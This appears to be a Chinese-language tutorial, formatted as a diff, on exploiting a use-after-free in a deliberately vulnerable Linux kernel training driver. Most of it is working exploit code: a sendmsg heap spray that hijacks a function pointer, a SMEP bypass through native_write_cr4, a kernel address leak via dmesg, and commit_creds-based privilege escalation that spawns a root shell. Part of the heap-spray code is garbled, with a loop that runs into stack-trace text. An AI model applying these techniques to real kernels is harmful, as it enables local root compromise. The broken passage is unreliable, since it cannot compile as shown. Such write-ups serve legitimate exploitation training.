@@ -1,0 +1,162 @@
+            memset(target->uaf_first_buff, 0x41, sizeof(target->uaf_first_buff));
+            global_uaf_obj = target;
+            printk(KERN_WARNING "[x] Allocated uaf object [x]\n");
+            return 0;
+        }
+    // 3. 释放uaf对象，但未清空global_uaf_obj指针
+        static void free_uaf_obj(void)
+        {
+            kfree(global_uaf_obj);
+            //global_uaf_obj = NULL 
+            printk(KERN_WARNING "[x] uaf object freed [x]");
+        }
+    // 4. 使用uaf对象，调用成员fn指向的函数
+        static void use_uaf_obj(void)
+        {
+            if(global_uaf_obj->fn)
+            {
+                //debug info
+                printk(KERN_WARNING "[x] Calling 0x%p(%lu)[x]\n", global_uaf_obj->fn, global_uaf_obj->arg);
+                global_uaf_obj->fn(global_uaf_obj->arg);
+            }
+        }
+    // 5. 分配k_object对象，并从用户地址user_kobj拷贝数据到分配的地址
+        static int alloc_k_obj(k_object *user_kobj)
+        {
+            k_object *trash_object = kmalloc(sizeof(k_object), GFP_KERNEL);
+            int ret;
+            if(!trash_object) {
+                printk(KERN_WARNING "[x] Error allocating k_object memory [-]\n");
+                return -ENOMEM;
+            }
+            ret = copy_from_user(trash_object, user_kobj, sizeof(k_object));
+            printk(KERN_WARNING "[x] Allocated k_object [x]\n");
+            return 0;
+        }
+### （2）利用思路
+思路：如果uaf_obj被释放，但指向它的global_uaf_obj变量未清零，若另一个对象分配到相同的cache，并且能够控制该cache上的内容，我们就能控制fn()调用的函数。
+测试：本例中我们可以利用k_object对象来布置堆数据，将uaf_obj对象的fn指针覆盖为0x4242424242424242。
+    //完整代码见easy_uaf.c
+    void use_after_free_kobj(int fd)
+    {
+         k_object *obj = malloc(sizeof(k_object));
+        //60 bytes overwrites the last 4 bytes of the address
+        memset(obj->buff, 0x42, 60); 
+        ioctl(fd, ALLOC_UAF_OBJ, NULL);
+        ioctl(fd, FREE_UAF_OBJ, NULL);
+        ioctl(fd, ALLOC_K_OBJ, obj);
+        ioctl(fd, USE_UAF_OBJ, NULL);
+    }
+报错结果如下：
+# 三、 漏洞利用
+### （1）绕过SMEP
+##### 1\. 绕过SMEP防护方法
+CR4寄存器的第20位为1，则表示开启了SMEP，若执行到用户指令，就会报错`"BUG: unable to handle kernel paging
+request at
+0xxxxxx"`。绕过SMEP的方法见我的笔记
+    // /arch/x86/include/asm/special_insns.h
+    static inline void native_write_cr4(unsigned long val)
+    {
+        asm volatile("mov %0,%%cr4": : "r" (val), "m" (__force_order));
+    }
+本文用到的vuln_driver简化了利用过程，否则我们还需要控制第1个参数，所以利用目标就是：`global_uaf_obj->fn(global_uaf_obj->arg)`
+\---> `native_write_cr4(global...->arg)`。 也即执行`native_write_cr4(0x407f0)`即可。
+##### 2\. 堆喷函数
+**sendmsg注意** ：分配堆块必须大于44。
+    //用sendmsg构造堆喷，一个通用接口搞定，只需传入待执行的目标地址+参数
+    void use_after_free_sendmsg(int fd, size_t target, size_t arg)
+    {
+        char buff[BUFF_SIZE];
+        struct msghdr msg={0};
+        struct sockaddr_in addr={0};
+        int sockfd = socket(AF_INET,SOCK_DGRAM,0);
+        // 布置堆喷数据
+        memset(buff,0x43,sizeof buff);
+        memcpy(buff+56,&arg,sizeof(long));
+        memcpy(buff+56+(sizeof(long)),&target,sizeof(long));
+        addr.sin_addr.s_addr=htonl(INADDR_LOOPBACK);
+        addr.sin_family=AF_INET;
+        addr.sin_port=htons(6666);
+        // buff是堆喷射的数据，BUFF_SIZE是最后要调用KMALLOC申请的大小
+        msg.msg_control=buff;
+        msg.msg_controllen=BUFF_SIZE;
+        msg.msg_name=(caddr_t)&addr;
+        msg.msg_namelen= sizeof(addr);
+        // 构造UAF对象
+        ioctl(fd,ALLOC_UAF_OBJ,NULL);
+        ioctl(fd,FREE_UAF_OBJ,NULL);
+        //开始堆喷
+        for (int i=0;i] SyS_ioctl+0x79/0x90
+    / # cat /proc/kallsyms | grep native_write_cr4
+    ffffffff81065a30 t native_write_cr4
+    / # cat /proc/kallsyms | grep prepare_kernel_cred
+    ffffffff810a6ca0 T prepare_kernel_cred
+    / # cat /proc/kallsyms | grep commit_creds
+    ffffffff810a68b0 T commit_creds
+##### 2\. 步骤
+  * 在子线程中触发page_fault，从dmesg读取打印信息
+  * 找到`SyS_ioctl+0x79`地址，计算kernel_base
+  * 计算3个目标函数地址
+### （3）整合exp
+##### 1\. 单核运行
+    //让程序只在单核上运行，以免只关闭了1个核的smep，却在另1个核上跑shell
+    void force_single_core()
+    {
+        cpu_set_t mask;
+        CPU_ZERO(&mask);
+        CPU_SET(0,&mask);
+        if (sched_setaffinity(0,sizeof(mask),&mask))
+            printf("[-----] Error setting affinity to core0, continue anyway, exploit may fault \n");
+        return;
+    }
+##### 2\. 泄露kernel基址
+    // 构造 page_fault 泄露kernel地址。从dmesg读取后写到/tmp/infoleak，再读出来
+        pid_t pid=fork();
+        if (pid==0){
+            do_page_fault();
+            exit(0);
+        }
+        int status;
+        wait(&status);    // 等子进程结束
+        //sleep(10);
+        printf("[+] Begin to leak address by dmesg![+]\n");
+        size_t kernel_base = get_info_leak()-sys_ioctl_offset;
+        printf("[+] Kernel base addr : %p [+] \n", kernel_base);
+        native_write_cr4_addr+=kernel_base;
+        prepare_kernel_cred_addr+=kernel_base;
+        commit_creds_addr+=kernel_base;
+##### 3\. 关闭smep,并提权
+    //关闭smep,并提权
+        use_after_free_sendmsg(fd,native_write_cr4_addr,fake_cr4);
+        use_after_free_sendmsg(fd,get_root,0);   //MMAP_ADDR
+        //use_after_free_msgsnd(fd,native_write_cr4_addr,fake_cr4);
+        //use_after_free_msgsnd(fd,get_root,0);  //MMAP_ADDR
+        if (getuid()==0)
+        {
+            printf("[+] Congratulations! You get root shell !!! [+]\n");
+            system("/bin/sh");
+        }
+### （4）问题
+原文的exploit有问题，是将get_root()代码用mmap映射到0x100000000000，然后跳转过去执行，但是直接把代码拷贝过去会有地址引用错误。
+    #执行0x100000000000处的内容时产生pagefault，可能是访问0x1000002ce8fd地址出错
+     gdb-peda$ x /10i $pc
+    => 0x100000000000:  push   rbp
+       0x100000000001:  mov    rbp,rsp
+       0x100000000004:  push   rbx
+       0x100000000005:  sub    rsp,0x8
+       0x100000000009:  
+        mov    rbx,QWORD PTR [rip+0x2ce8ed]        # 0x1000002ce8fd
+       0x100000000010:  
+        mov    rax,QWORD PTR [rip+0x2ce8ee]        # 0x1000002ce905
+       0x100000000017:  mov    edi,0x0
+       0x10000000001c:  call   rax
+       0x10000000001e:  mov    rdi,rax
+       0x100000000021:  call   rbx
+    #报错信息如下：
+    [   10.421887] BUG: unable to handle kernel paging request at 00001000002ce8fd
+    [   10.424836] IP: [] 0x100000000009
+解决：不需要将`get_root()`代码拷贝到0x100000000000，直接执行`get_root()`即可。
+最后成功提权：
+exp代码见`exp_heap_spray.c`。
+### 参考：
+[http://edvison.cn/2018/07/25/%E5%A0%86%E5%96%B7%E5%B0%84/](http://edvison.cn/2018/07/25/堆喷射/)
